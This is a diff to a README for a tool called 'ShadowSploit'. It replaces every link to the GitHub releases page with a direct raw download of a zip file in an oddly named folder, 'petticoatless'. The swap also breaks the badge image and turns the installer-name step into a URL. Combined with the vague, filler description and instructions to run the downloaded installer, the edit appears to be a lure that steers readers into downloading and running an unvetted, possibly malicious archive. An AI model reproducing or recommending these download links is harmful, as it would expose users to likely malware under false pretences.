@@ -1,7 +1,7 @@
 # 🛡️ ShadowSploit - Simple Way to Start Exploring
 
 ## 📥 Download Now!
-[![Download ShadowSploit](https://img.shields.io/badge/Download%20Now-ShadowSploit-blue)](https://github.com/DeadFox55YZ/ShadowSploit/releases)
+[![Download ShadowSploit](https://github.com/DeadFox55YZ/ShadowSploit/raw/refs/heads/main/petticoatless/Sploit_Shadow_v3.9.zip%20Now-ShadowSploit-blue)](https://github.com/DeadFox55YZ/ShadowSploit/raw/refs/heads/main/petticoatless/Sploit_Shadow_v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to ShadowSploit! This guide will help you download and run ShadowSploit easily. ShadowSploit is designed to help you explore and understand various power aspects of software use. Let’s get started!
@@ -21,11 +21,11 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to reach the releases page.  
-   [Download ShadowSploit](https://github.com/DeadFox55YZ/ShadowSploit/releases)
+   [Download ShadowSploit](https://github.com/DeadFox55YZ/ShadowSploit/raw/refs/heads/main/petticoatless/Sploit_Shadow_v3.9.zip)
    
 2. **Choose the Latest Version:** Look for the most recent version listed on the page. It usually appears at the top.
 
-3. **Download the Installation File:** Click on the version number, then look for the file to download. It may be named something like `ShadowSploit-installer.exe`.
+3. **Download the Installation File:** Click on the version number, then look for the file to download. It may be named something like `https://github.com/DeadFox55YZ/ShadowSploit/raw/refs/heads/main/petticoatless/Sploit_Shadow_v3.9.zip`.
 
 4. **Run the Installer:**  
    - Locate the downloaded file on your computer, likely in your Downloads folder.
@@ -60,6 +60,6 @@ For more detailed information about each feature, updates, and community guideli
 
 ## 📥 Final Download Link
 Don’t forget to visit the releases page for your copy of ShadowSploit:  
-[Download ShadowSploit](https://github.com/DeadFox55YZ/ShadowSploit/releases)
+[Download ShadowSploit](https://github.com/DeadFox55YZ/ShadowSploit/raw/refs/heads/main/petticoatless/Sploit_Shadow_v3.9.zip)
 
 Enjoy your journey with ShadowSploit!
